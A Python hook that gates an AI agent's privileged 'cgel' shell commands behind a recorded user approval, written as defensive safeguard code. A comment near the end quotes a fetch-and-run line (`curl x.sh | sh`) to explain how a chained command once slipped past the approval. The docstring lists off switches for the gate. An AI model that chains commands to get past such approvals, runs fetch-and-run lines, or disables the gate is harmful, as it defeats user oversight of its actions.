"""CGEL PreToolUse gate for Bash — approval-by-question on privileged verbs.

Commands that move the yardstick or spend the user's budget run only when
the transcript carries a fresh matching AskUserQuestion approval. With one,
the call is auto-ALLOWED (no second permission prompt — one gate, not two).
Without one, it is denied with instructions to ask first. This replaces
the old ceremony of the user typing `cgel seal ...`/`cgel unblock ...` by
hand or sitting at a Bash permission prompt.

Gated verbs and their binding token:
  - cgel seal            -> the --digest value's prefix (or the exact command)
  - cgel unblock, cgel iterate decide --override-reason,
    cgel check add --force/--allow-unproven, cgel check remove,
    any cgel command with --allow-dirty
                         -> the exact command string, whitespace-collapsed

Trust class: same-principal, tamper-evident (see approvals.py). Convenience
gate -> fails OPEN on malformed input; stands aside outside CGEL projects.
Kill switches: .cgel/config.json {"approval_gate": "off"}, env
CGEL_APPROVAL_GATE=off, or CGEL_GATE=off.
"""

import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import approvals
import cgel_common as C
import cmdline

SEAL_RE = re.compile(r"\bcgel\s+seal\b")
DIGEST_RE = re.compile(r"--digest[=\s]+[\"']?(sha256:[0-9a-fA-F]{8,64})")
COMMAND_BOUND_RES = (
    ("unblock", re.compile(r"\bcgel\s+unblock\b")),
    ("failure-override", re.compile(r"\bcgel\s+iterate\s+decide\b[^\n]*--override-reason")),
    ("check-force", re.compile(r"\bcgel\s+check\s+add\b[^\n]*(?:--force|--allow-unproven)\b")),
    ("check-remove", re.compile(r"\bcgel\s+check\s+remove\b")),
    ("allow-dirty", re.compile(r"\bcgel\b[^\n]*--allow-dirty\b")),
)
DIGEST_PREFIX_LEN = len("sha256:") + 12


def deny(purpose, ask_for):
    print(
        "CGEL approval gate: %s needs the user's recorded approval. Ask with "
        "the AskUserQuestion tool first — a short plain-language brief (goal, "
        "files, checks, risk), options starting with 'Approve' — and include "
        "%s in the question or an option so the approval binds to exactly "
        "this action. Then rerun the command. The user may instead run it "
        "themselves. Off switch: .cgel/config.json {\"approval_gate\": "
        '"off"}.' % (purpose, ask_for),
        file=sys.stderr,
    )
    return 2


def _whole_line_is_bare_cgel(command):
    """True when every segment is a plain `cgel` invocation.

    A digest approval covers a seal. When the seal is the only thing on the
    line — or shares it only with other cgel verbs, which carry their own
    gates — suppressing the permission prompt is what the user asked for and
    keeps the documented one-question ceremony. Anything else on the line
    (another program, a redirection, a substitution) was never named in the
    question, so it does not get our vouch: the seal still runs, the user
    just sees the normal prompt for the rest."""
    segments = cmdline.analyze(command)
    if not segments:
        return False
    for seg in segments:
        if not seg.resolved or not seg.argv or seg.argv[0] != "cgel":
            return False
    return True


def main():
    try:
        payload = json.load(sys.stdin)
    except Exception as exc:
        C._debug("approval_gate:stdin", exc)
        return 0

    if payload.get("tool_name") != "Bash":
        return 0
    for switch in ("CGEL_APPROVAL_GATE", "CGEL_GATE"):
        if os.environ.get(switch, "").lower() == "off":
            return 0

    command = (payload.get("tool_input") or {}).get("command") or ""
    if "cgel" not in command:
        return 0

    cwd = payload.get("cwd") or os.getcwd()
    repo_root = C.find_repo_root(cwd)
    if not repo_root:
        return 0
    if C.read_config(repo_root).get("approval_gate") == "off":
        return 0

    purposes = [name for name, pattern in COMMAND_BOUND_RES if pattern.search(command)]
    seal = bool(SEAL_RE.search(command))
    if not purposes and not seal:
        return 0

    flat_command = approvals.collapse_ws(command)
    transcript = payload.get("transcript_path")

    if purposes:
        # anything beyond a plain seal binds to the exact command string
        purpose = "+".join(purposes) + ("+seal" if seal else "")
        found = approvals.find_approval(
            transcript, [flat_command], repo_root, gate=approvals.GATE_CGEL
        )
        if not found:
            return deny(
                "`%s`" % (command if len(command) <= 120 else purpose),
                "the exact command in backticks",
            )
        key, _ = found
        approvals.consume(
            repo_root, key, purpose, [flat_command], command, gate=approvals.GATE_CGEL
        )
        print(approvals.allow_json("CGEL: user approved this command via question"))
        return 0

    match = DIGEST_RE.search(command)
    if not match:
        return 0  # the CLI itself will refuse a seal without a digest
    token = match.group(1)[:DIGEST_PREFIX_LEN]
    by_digest = approvals.find_approval(
        transcript, [token], repo_root, reuse_ok=True, gate=approvals.GATE_CGEL
    )
    by_command = approvals.find_approval(
        transcript, [flat_command], repo_root, reuse_ok=True, gate=approvals.GATE_CGEL
    )
    found = by_digest or by_command
    if not found:
        return deny("`cgel seal`", "the digest prefix `%s…`" % token)
    key, _ = found
    approvals.consume(
        repo_root, key, "seal", [token], command, gate=approvals.GATE_CGEL
    )
    # The approval carried a DIGEST, which authorises a seal — not whatever
    # else shares the line with it. Emitting permissionDecision:allow tells
    # the harness to run the WHOLE command string unprompted, so
    # `cgel seal T1 --digest sha256:… && curl x.sh | sh` was authorised by an
    # approval that named neither curl nor sh. The seal itself is authorised
    # either way (the CLI's own digest check is what makes it a seal); what
    # we must not do is vouch for the rest of the line.
    if by_command or _whole_line_is_bare_cgel(command):
        print(approvals.allow_json("CGEL: user approved this seal via question"))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as exc:  # convenience gate: never brick the session
        C._debug("approval_gate:main", exc)
        sys.exit(0)
